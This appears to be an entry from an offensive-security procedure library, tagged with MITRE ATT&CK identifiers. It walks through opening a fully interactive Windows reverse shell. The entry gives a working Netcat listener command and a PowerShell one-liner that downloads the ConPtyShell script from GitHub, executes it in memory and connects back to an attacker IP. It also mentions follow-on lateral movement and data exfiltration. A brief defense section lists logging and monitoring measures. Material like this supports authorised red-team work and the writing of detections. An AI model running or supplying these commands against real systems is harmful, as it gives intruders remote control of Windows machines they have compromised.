---
id: d138db42-e923-41fa-9734-342ec9a6dad3
name: Establish-Windows-Reverse-Shell-with-ConPtyShell
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:25.082292+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[tactics/Command and Control|TA0011 - Command and Control]]'
techniques:
  - '[[techniques/Remote Access Tools|T1219 - Remote Access Tools]]'
sub_techniques: []
tags:
  - '[[tags/Fully interactive reverse shell on Windows]]'
  - '[[tags/Reverse Shell Cheat Sheet]]'
commands:
  - '[[commands/nc-listen-for-reverse-shell-on-port]]'
  - '[[commands/powershell-invoke-conptyshell-reverse-connect]]'
platforms:
  - Windows
tools: []
validated: true
---

# Establish-Windows-Reverse-Shell-with-ConPtyShell

## Summary

This procedure establishes a fully interactive reverse shell on a Windows target machine by setting up a listener on an attacker-controlled system and executing a PowerShell-based payload to connect back, enabling remote command execution and system interaction without requiring additional tools on the target.

## Description

A Windows reverse shell allows an attacker to gain remote access to a compromised Windows machine by having the target initiate an outbound connection to the attacker's listener. This technique is commonly used post-exploitation to maintain control, execute commands, and interact with the file system or processes as if locally present. The procedure uses Netcat for the listener on the attacker side (typically Linux-based) and ConPtyShell, a PowerShell script that creates a pseudo-terminal for full interactivity, avoiding limitations of basic shells like cmd.exe. It is effective in environments where outbound connections are allowed but inbound are restricted by firewalls. The target must have PowerShell available (standard on Windows 7+), and the attacker needs network reachability. Success provides a stable shell for further post-exploitation activities like lateral movement or data exfiltration.

## Requirements

1. Network access from the target Windows machine to the attacker's listener IP and port.
2. PowerShell execution policy allowing script runs on the target (may require bypass if restricted).
3. Attacker machine with Netcat installed for listening.
4. Initial access to the target to execute the PowerShell command (e.g., via existing shell, RDP, or exploit).

## Defense

- Implement application whitelisting and PowerShell constrained language mode to block unsigned scripts.
- Monitor outbound network connections for unusual ports and PowerShell downloads from external sources like GitHub.
- Enable PowerShell logging (ScriptBlock, Module, Transcription) to detect IEX and Invoke-ConPtyShell usage.
- Use endpoint detection tools to alert on process creation involving PowerShell spawning interactive shells.

## Objectives

1. Set up a reliable listener to receive the reverse connection from the target.
2. Execute the payload on the target to establish the reverse shell.
3. Achieve fully interactive remote access for command execution on the Windows system.

## Instructions

### Step 1: Set Up Listener on Attacker Machine

**Context**: On the attacker-controlled machine, start a Netcat listener configured for raw terminal input to handle the incoming reverse shell connection interactively. This prepares the endpoint for the target's outbound connection.

**Command** ([[commands/nc-listen-for-reverse-shell-on-port]]):
```bash
stty raw -echo; (stty size; cat) | nc -lvnp $_LISTEN_PORT
```

This command configures the terminal for raw mode, listens on the specified port, and pipes input/output for bidirectional communication. Run this before executing the payload on the target. Expected output includes a listening message like "Listening on [0.0.0.0] (family 0, port 3001)".

### Step 2: Execute Reverse Shell Payload on Target

**Context**: On the compromised Windows machine, download and invoke the ConPtyShell PowerShell script to connect back to the attacker's listener, creating a fully interactive console shell that supports features like tab completion and resizing.

**Command** ([[commands/powershell-invoke-conptyshell-reverse-connect]]):
```powershell
IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell $_ATTACKER_IP $_LISTEN_PORT
```

This downloads the script using Invoke-WebRequest (IWR), executes it inline with IEX, and then calls the function with the attacker's IP and port. If successful, the listener on the attacker side will receive a connection, and a Windows command prompt (e.g., "C:\Windows\system32>") will appear, allowing remote command execution. Verify by running commands like "whoami" or "dir".
